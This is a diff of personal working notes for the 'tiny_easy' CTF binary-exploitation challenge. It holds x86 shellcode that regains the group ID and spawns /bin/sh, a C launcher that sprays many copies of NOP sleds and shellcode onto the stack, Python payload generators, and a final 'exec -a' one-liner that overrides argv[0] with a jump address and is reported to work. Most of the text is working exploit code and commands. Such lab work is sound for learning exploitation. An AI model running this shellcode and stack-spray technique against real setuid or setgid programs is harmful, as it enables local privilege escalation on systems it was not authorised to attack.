@@ -38,6 +38,10 @@ man execve:
 since we're execve'ing into tiny_easy, our real/effective IDs are just tiny_easy
     -> saved gid should be tiny_easy_pwn
     -> getresgid() -> setreuid()
+    --> this isn't the case
+        there's exceptions, e.g. if the filesystem has NOSUID flag -- which i think the /tmp/ filesystem does
+        so, it might be easier to just inject payload (massive args list) into a file in /tmp/, and run ./tiny_easy < /tmp/args
+        BUT, this runs into the issue of breaking piece 2 -- need to override program_filename argument (argv[0])
 
 --- piece 2: inject custom "program_filename" onto stack
 running with a custom environment: env -i TEST="TEST" bash -l -c "gdb tiny_easy"
@@ -63,11 +67,10 @@ gcc -m32 -fno-stack-protector -no-pie -Wl,-z,relro,-z,now te.c
     
 "heap spraying": modify payload to include many, many copies of the shellcode, with massive NOP paddings
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-
-
+--------- this code works, but because it has to be run from the /tmp/ directory (which has the NOSUID bit set i believe?), it cannot acquire the egid of the tiny_easy process
+--------- so, i think it's a dead end
+--------- (one POTENTIAL solution would be to modify the shellcode to execve() ANOTHER instance of tiny_easy, this time launched from the tiny_easy process itself...
+---------       but, this is complicated, and i'm not 100% certain it would work anyway?)
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -79,7 +82,8 @@ int main() {
         char* args[N_COPIES];
         char* env[2];
         const char strpayload[] = "/bin/sh";
-        const char shellcode[] = "\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x6a\x0b\x58\x8b\x5c\x24\x04\x31\xc9\x31\xd2\xcd\x80";        const char guess_addr[] = "\xc4\xa7\xac\xff";
+        const char shellcode[] = "\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x6a\x0b\x58\x8b\x5c\x24\x04\x31\xc9\x31\xd2\xcd\x80";
+        const char guess_addr[] = "\xc4\xa7\xac\xff";
 
         env[0] = "ENV=ENV";
         env[1] = NULL;
@@ -121,7 +125,10 @@ int main() {
         if (ec) perror("execve error: ");
         return 0;
 }
-    
+---------
+---------
+---------
+
 https://lwn.net/Articles/630727/
 
 some addresses where arg strings ended up:
@@ -130,3 +137,30 @@ ff85b7c4
 ff9d27c4
 ffb757c4
 ffee27c4
+
+------- 
+------- 
+-------
+launching ./tiny_easy directly (well, using bash 'exec', with -a arg which allows us to override argv[0])
+
+    * output args: programName, NOP sled, (test) shellcode. NOT using python print() outright because of issues with UTF-8 encoding
+    * can debug by outputting to file and running in gdb with "run $(cat /tmp/argsfile)" to make sure args land accurately on stack
+
+python3 -c 
+    "import sys; 
+    num_repeats = 4;
+    nop_sled_len = 100;
+    sys.stdout.buffer.write(
+        b'/bin/sh ' 
+        + (
+            b'\x90'*nop_sled_len + b'\x6a\x04\x58\x6a\x01\x5b\x8b\x4c\x24\x04\x6a\x10\x5a\xcd\x80' 
+            + b' '
+        ) * num_repeats
+    )"
+
+python3 -c "import sys; num_repeats = 4; nop_sled_len = 100; sys.stdout.buffer.write(b'/bin/sh ' + ( b'\x90'*nop_sled_len + b'\x6a\x04\x58\x6a\x01\x5b\x8b\x4c\x24\x04\x6a\x10\x5a\xcd\x80' + b' ') * num_repeats)"
+
+    * wrap it all in an exec -a
+    * use jmp address as argv[0]
+    * it works! (demo shellcode to write-syscall 16 bytes of argv[1], aka "/bin/sh"
+( exec -a $(printf "\xc4\xa7\xca\xff") ./tiny_easy $(python3 -c "import sys; num_repeats = 200; nop_sled_len = 4060; sys.stdout.buffer.write(b'/bin/sh ' + ( b'\x90'*nop_sled_len + b'\x6a\x04\x58\x6a\x01\x5b\x8b\x4c\x24\x04\x6a\x10\x5a\xcd\x80' + b' ') * num_repeats)"))
